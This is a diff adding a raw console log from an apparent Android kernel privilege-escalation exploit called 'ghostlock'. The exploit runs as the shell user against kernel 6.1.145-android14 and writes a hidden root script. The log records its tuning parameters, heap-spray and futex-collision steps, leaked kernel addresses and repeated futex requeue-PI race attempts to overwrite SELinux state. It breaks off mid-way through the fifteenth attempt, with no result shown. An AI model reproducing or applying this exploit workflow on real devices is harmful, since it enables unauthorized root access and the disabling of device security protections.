@@ -1,0 +1,439 @@
+[33m[*] [0mkernel: 6.1.145-android14-11-maybe-dirty
+[32m[+] [0mresolved profile loaded: 6.1.145-android14-11-maybe-dirty
+[33m[*] [0mcpu pair: main=0 consumer=1
+[33m[*] [0mruntime home=/data/local/tmp script=/data/local/tmp/.ghostlock_root.sh
+[33m[*] [0mdebug.execution.begin release=6.1.145-android14-11-maybe-dirty
+[33m[*] [0mdebug.execution.recommended_cpus.main=0
+[33m[*] [0mdebug.execution.recommended_cpus.consumer=1
+[33m[*] [0mdebug.execution.selected_cpus.main=0
+[33m[*] [0mdebug.execution.selected_cpus.consumer=1
+[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
+[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
+[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
+[33m[*] [0mdebug.execution.race.route_wait_ms=1000
+[33m[*] [0mdebug.execution.race.setup_settle_us=50000
+[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
+[33m[*] [0mdebug.execution.stages.w1_attempts=15
+[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
+[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
+[33m[*] [0mdebug.execution.stages.w2_attempts=15
+[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
+[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
+[33m[*] [0mdebug.execution.stages.w3_attempts=6
+[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
+[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=2000
+[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=16
+[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=20000
+[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=0
+[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=0
+[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=1
+[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=1
+[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
+[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
+[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
+[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
+[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
+[33m[*] [0mdebug.execution.end
+[33m[*] [0msoc: qcom/other; kernel_phys_load=0x80000000
+[33m[*] [0minit_cred image=ffffffc0821f24f0 alias=ffffff80021f24f0
+[33m[*] [0mroot script written path=/data/local/tmp/.ghostlock_root.sh bytes=6081
+[33m[*] [0miomem cache: no usable dump, keeping the built-in geometry
+[32m[+] [0mstartup context pid=26939 uid=2000 euid=2000 gid=2000 egid=2000 boot_ms=689219 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=26939 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=26939 label=ghostlock_oplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=26939 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff80021d2f98 bootid_data=ffffff800257a548 init_task=ffffff80021dfc00 root_tg=ffffff8002422740 sysctl_bootid=ffffff800257a548
+[33m[*] [0mp0 kernel_phys_load=0000000080000000 delta=0000000000000000
+[33m[*] [0mmain thread running on cpu=0
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0m[T+3ms] pre-W1 drain
+[33m[*] [0mW1: SELinux attempt 1/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+226ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +256ms
+[33m[*] [0m[spray] finding futex collisions... +592ms
+[33m[*] [0m[spray] early collision screen 11/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1667ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff884ca81400 +1779ms
+[33m[*] [0m[spray] payload ready +1783ms
+[31m[-] [0mpage ffffff884ca80000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 1/4 +1995ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +254ms
+[33m[*] [0m[spray] finding futex collisions... +574ms
+[33m[*] [0m[spray] early collision screen 8/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1651ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aade96c00 +1690ms
+[33m[*] [0m[spray] payload ready +1693ms
+[33m[*] [0mprepare_kernel_page ok attempt=2 +3914ms
+[33m[*] [0m[T+4144ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=1 errno=0; waiting route_done
+[33m[*] [0mtcp route enter page=ffffff8aade90000 fake_lock=ffffff8aade90e80 fake_w0=ffffff8aade91180 fake_task=ffffff8aade95800 task=ffffff80021dfc00 attempts=2000 arm=16 hold=20000
+[33m[*] [0mtcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+5692ms]   PI route done
+[33m[*] [0mW1: SELinux attempt 2/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+5848ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +285ms
+[33m[*] [0m[spray] finding futex collisions... +614ms
+[33m[*] [0m[spray] early collision screen 3/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1686ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aac2bdc00 +1727ms
+[33m[*] [0m[spray] payload ready +1729ms
+[33m[*] [0mprepare_kernel_page ok attempt=1 +1949ms
+[33m[*] [0m[T+7803ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=1 errno=0; waiting route_done
+[33m[*] [0mtcp route enter page=ffffff8aac2b8000 fake_lock=ffffff8aac2b8e80 fake_w0=ffffff8aac2b9180 fake_task=ffffff8aac2bd800 task=ffffff80021dfc00 attempts=2000 arm=16 hold=20000
+[33m[*] [0mtcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+8353ms]   PI route done
+[33m[*] [0mW1: SELinux attempt 3/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+8507ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +273ms
+[33m[*] [0m[spray] finding futex collisions... +600ms
+[33m[*] [0m[spray] early collision screen 10/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1704ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aab808c00 +1746ms
+[33m[*] [0m[spray] payload ready +1749ms
+[31m[-] [0mpage ffffff8aab808000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 1/4 +1975ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +276ms
+[33m[*] [0m[spray] finding futex collisions... +630ms
+[33m[*] [0m[spray] early collision screen 6/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1695ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aab5d2400 +1734ms
+[33m[*] [0m[spray] payload ready +1736ms
+[33m[*] [0mprepare_kernel_page ok attempt=2 +3930ms
+[33m[*] [0m[T+12441ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=1 errno=0; waiting route_done
+[33m[*] [0mtcp route enter page=ffffff8aab5d0000 fake_lock=ffffff8aab5d0e80 fake_w0=ffffff8aab5d1180 fake_task=ffffff8aab5d5800 task=ffffff80021dfc00 attempts=2000 arm=16 hold=20000
+[33m[*] [0mtcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+12994ms]   PI route done
+[33m[*] [0mW1: SELinux attempt 4/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+13147ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +275ms
+[33m[*] [0m[spray] finding futex collisions... +628ms
+[33m[*] [0m[spray] early collision screen 9/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1664ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aa469b400 +1694ms
+[33m[*] [0m[spray] payload ready +1697ms
+[33m[*] [0mprepare_kernel_page ok attempt=1 +1911ms
+[33m[*] [0m[T+15063ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=1 errno=0; waiting route_done
+[33m[*] [0mtcp route enter page=ffffff8aa4698000 fake_lock=ffffff8aa4698e80 fake_w0=ffffff8aa4699180 fake_task=ffffff8aa469d800 task=ffffff80021dfc00 attempts=2000 arm=16 hold=20000
+[33m[*] [0mtcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+16621ms]   PI route done
+[33m[*] [0mW1: SELinux attempt 5/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+16776ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +274ms
+[33m[*] [0m[spray] finding futex collisions... +607ms
+[33m[*] [0m[spray] early collision screen 5/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1619ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff884c992000 +1739ms
+[33m[*] [0m[spray] payload ready +1743ms
+[33m[*] [0mprepare_kernel_page ok attempt=1 +1944ms
+[33m[*] [0m[T+18726ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=1 errno=0; waiting route_done
+[33m[*] [0mtcp route enter page=ffffff884c990000 fake_lock=ffffff884c990e80 fake_w0=ffffff884c991180 fake_task=ffffff884c995800 task=ffffff80021dfc00 attempts=2000 arm=16 hold=20000
+[33m[*] [0mtcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+20275ms]   PI route done
+[33m[*] [0mW1: SELinux attempt 6/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+20433ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +283ms
+[33m[*] [0m[spray] finding futex collisions... +623ms
+[33m[*] [0m[spray] early collision screen 5/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1649ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aa4b61400 +1685ms
+[33m[*] [0m[spray] payload ready +1688ms
+[31m[-] [0mpage ffffff8aa4b60000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 1/4 +1902ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +257ms
+[33m[*] [0m[spray] finding futex collisions... +578ms
+[33m[*] [0m[spray] early collision screen 4/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1633ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff884cb37c00 +1770ms
+[33m[*] [0m[spray] payload ready +1774ms
+[33m[*] [0mprepare_kernel_page ok attempt=2 +3878ms
+[33m[*] [0m[T+24317ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=1 errno=0; waiting route_done
+[33m[*] [0mtcp route enter page=ffffff884cb30000 fake_lock=ffffff884cb30e80 fake_w0=ffffff884cb31180 fake_task=ffffff884cb35800 task=ffffff80021dfc00 attempts=2000 arm=16 hold=20000
+[33m[*] [0mtcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+25866ms]   PI route done
+[33m[*] [0mW1: SELinux attempt 7/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+26022ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +265ms
+[33m[*] [0m[spray] finding futex collisions... +571ms
+[33m[*] [0m[spray] early collision screen 11/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1628ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8903782800 +1641ms
+[33m[*] [0m[spray] payload ready +1644ms
+[31m[-] [0mpage ffffff8903780000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 1/4 +1852ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +253ms
+[33m[*] [0m[spray] finding futex collisions... +594ms
+[33m[*] [0m[spray] early collision screen 8/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1626ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8a6c143000 +1841ms
+[33m[*] [0m[spray] payload ready +1846ms
+[31m[-] [0mpage ffffff8a6c140000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 2/4 +3910ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +250ms
+[33m[*] [0m[spray] finding futex collisions... +586ms
+[33m[*] [0m[spray] early collision screen 5/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1611ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8a6c040000 +1796ms
+[33m[*] [0m[spray] payload ready +1800ms
+[31m[-] [0mpage ffffff8a6c040000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 3/4 +5908ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +237ms
+[33m[*] [0m[spray] finding futex collisions... +556ms
+[33m[*] [0m[spray] early collision screen 6/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1574ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aa2e21800 +1610ms
+[33m[*] [0m[spray] payload ready +1613ms
+[31m[-] [0mpage ffffff8aa2e20000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 4/4 +7734ms
+[31m[-] [0m  heap spray failed
+[31m[-] [0mW1: SELinux attempt 7 route failed; backing off
+[33m[*] [0mW1: SELinux attempt 8/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+33864ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +245ms
+[33m[*] [0m[spray] finding futex collisions... +572ms
+[33m[*] [0m[spray] early collision screen 10/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1556ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aa6cf9800 +1600ms
+[33m[*] [0m[spray] payload ready +1602ms
+[33m[*] [0mprepare_kernel_page ok attempt=1 +1822ms
+[33m[*] [0m[T+35692ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=1 errno=0; waiting route_done
+[33m[*] [0mtcp route enter page=ffffff8aa6cf8000 fake_lock=ffffff8aa6cf8e80 fake_w0=ffffff8aa6cf9180 fake_task=ffffff8aa6cfd800 task=ffffff80021dfc00 attempts=2000 arm=16 hold=20000
+[33m[*] [0mtcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+37221ms]   PI route done
+[33m[*] [0mW1: SELinux attempt 9/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+37377ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +262ms
+[33m[*] [0m[spray] finding futex collisions... +589ms
+[33m[*] [0m[spray] early collision screen 6/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1648ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aab42f400 +1687ms
+[33m[*] [0m[spray] payload ready +1689ms
+[31m[-] [0mpage ffffff8aab428000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 1/4 +1895ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +243ms
+[33m[*] [0m[spray] finding futex collisions... +572ms
+[33m[*] [0m[spray] early collision screen 5/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1640ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff88af123400 +1834ms
+[33m[*] [0m[spray] payload ready +1838ms
+[31m[-] [0mpage ffffff88af120000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 2/4 +3929ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +257ms
+[33m[*] [0m[spray] finding futex collisions... +575ms
+[33m[*] [0m[spray] early collision screen 3/3 at 48%
+[33m[*] [0m[spray] futex collisions found +1736ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aa4c4d400 +1791ms
+[33m[*] [0m[spray] payload ready +1794ms
+[31m[-] [0mpage ffffff8aa4c48000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 3/4 +5924ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +243ms
+[33m[*] [0m[spray] finding futex collisions... +568ms
+[33m[*] [0m[spray] early collision screen 5/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1584ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8ab0840400 +1623ms
+[33m[*] [0m[spray] payload ready +1626ms
+[31m[-] [0mpage ffffff8ab0840000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 4/4 +7758ms
+[31m[-] [0m  heap spray failed
+[31m[-] [0mW1: SELinux attempt 9 route failed; backing off
+[33m[*] [0mW1: SELinux attempt 10/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+45245ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +275ms
+[33m[*] [0m[spray] finding futex collisions... +604ms
+[33m[*] [0m[spray] early collision screen 3/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1609ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aa4cd2000 +1642ms
+[33m[*] [0m[spray] payload ready +1645ms
+[33m[*] [0mprepare_kernel_page ok attempt=1 +1859ms
+[33m[*] [0m[T+47111ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=1 errno=0; waiting route_done
+[33m[*] [0mtcp route enter page=ffffff8aa4cd0000 fake_lock=ffffff8aa4cd0e80 fake_w0=ffffff8aa4cd1180 fake_task=ffffff8aa4cd5800 task=ffffff80021dfc00 attempts=2000 arm=16 hold=20000
+[33m[*] [0mtcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+48651ms]   PI route done
+[33m[*] [0mW1: SELinux attempt 11/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+48810ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +268ms
+[33m[*] [0m[spray] finding futex collisions... +599ms
+[33m[*] [0m[spray] early collision screen 6/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1626ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff88afcf8000 +1815ms
+[33m[*] [0m[spray] payload ready +1819ms
+[33m[*] [0mprepare_kernel_page ok attempt=1 +2039ms
+[33m[*] [0m[T+50855ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=1 errno=0; waiting route_done
+[33m[*] [0mtcp route enter page=ffffff88afcf8000 fake_lock=ffffff88afcf8e80 fake_w0=ffffff88afcf9180 fake_task=ffffff88afcfd800 task=ffffff80021dfc00 attempts=2000 arm=16 hold=20000
+[33m[*] [0mtcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+51410ms]   PI route done
+[33m[*] [0mW1: SELinux attempt 12/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+51564ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +275ms
+[33m[*] [0m[spray] finding futex collisions... +592ms
+[33m[*] [0m[spray] early collision screen 10/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1626ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8ab2e3a800 +1682ms
+[33m[*] [0m[spray] payload ready +1686ms
+[33m[*] [0mprepare_kernel_page ok attempt=1 +1887ms
+[33m[*] [0m[T+53458ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=1 errno=0; waiting route_done
+[33m[*] [0mtcp route enter page=ffffff8ab2e38000 fake_lock=ffffff8ab2e38e80 fake_w0=ffffff8ab2e39180 fake_task=ffffff8ab2e3d800 task=ffffff80021dfc00 attempts=2000 arm=16 hold=20000
+[33m[*] [0mtcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+55003ms]   PI route done
+[33m[*] [0mW1: SELinux attempt 13/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+55160ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +261ms
+[33m[*] [0m[spray] finding futex collisions... +581ms
+[33m[*] [0m[spray] early collision screen 7/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1607ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aa9f1b000 +1672ms
+[33m[*] [0m[spray] payload ready +1676ms
+[33m[*] [0mprepare_kernel_page ok attempt=1 +1898ms
+[33m[*] [0m[T+57067ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=1 errno=0; waiting route_done
+[33m[*] [0mtcp route enter page=ffffff8aa9f18000 fake_lock=ffffff8aa9f18e80 fake_w0=ffffff8aa9f19180 fake_task=ffffff8aa9f1d800 task=ffffff80021dfc00 attempts=2000 arm=16 hold=20000
+[33m[*] [0mtcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+58562ms]   PI route done
+[33m[*] [0mW1: SELinux attempt 14/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+58720ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +279ms
+[33m[*] [0m[spray] finding futex collisions... +612ms
+[33m[*] [0m[spray] early collision screen 3/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1621ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aa4644400 +1663ms
+[33m[*] [0m[spray] payload ready +1666ms
+[31m[-] [0mpage ffffff8aa4640000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 1/4 +1876ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +240ms
+[33m[*] [0m[spray] finding futex collisions... +582ms
+[33m[*] [0m[spray] early collision screen 5/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1600ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aa9ca1000 +1639ms
+[33m[*] [0m[spray] payload ready +1641ms
+[31m[-] [0mpage ffffff8aa9ca0000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 2/4 +3724ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +242ms
+[33m[*] [0m[spray] finding futex collisions... +589ms
+[33m[*] [0m[spray] early collision screen 7/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1613ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8aacbf1800 +1670ms
+[33m[*] [0m[spray] payload ready +1674ms
+[33m[*] [0mprepare_kernel_page ok attempt=3 +5601ms
+[33m[*] [0m[T+64326ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=1 errno=0; waiting route_done
+[33m[*] [0mtcp route enter page=ffffff8aacbf0000 fake_lock=ffffff8aacbf0e80 fake_w0=ffffff8aacbf1180 fake_task=ffffff8aacbf5800 task=ffffff80021dfc00 attempts=2000 arm=16 hold=20000
+[33m[*] [0mtcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+65886ms]   PI route done
+[33m[*] [0mW1: SELinux attempt 15/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff8002558f40 mode=1 leaf=0
+[33m[*] [0m[T+66044ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +255ms
+[33m[*] [0m[spray] finding futex collisions... +583ms
+[33m[*] [0m[spray] early collision screen 9/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1601ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8ab142ac00 +1644ms
+[33m[*] [0m[spray] payload ready +1647ms
+[31m[-] [0mpage ffffff8ab1428000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 1/4 +1854ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +239ms
+[33m[*] [0m[spray] finding futex collisions... +589ms
+[33m[*] [0m[spray] early collision screen 8/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1642ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8a5a366000 +1816ms
+[33m[*] [0m[spray] payload ready +1820ms
+[31m[-] [0mpage ffffff8a5a360000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 2/4 +3876ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +240ms
+[33m[*] [0m[spray] finding futex collisions... +556ms
+[33m[*] [0m[spray] early collision screen 6/3 at 37%
+[33m[*] [0m[spray] futex collisions found +1587ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8a6b939c00 +1790ms
+[33m[*] [0m[spray] payload ready +1794ms
+[33m[*] [0mprepare_kernel_page ok attempt=3 +5873ms
+[33m[*] [0m[T+71924ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=1 errno=0; waiting route_done
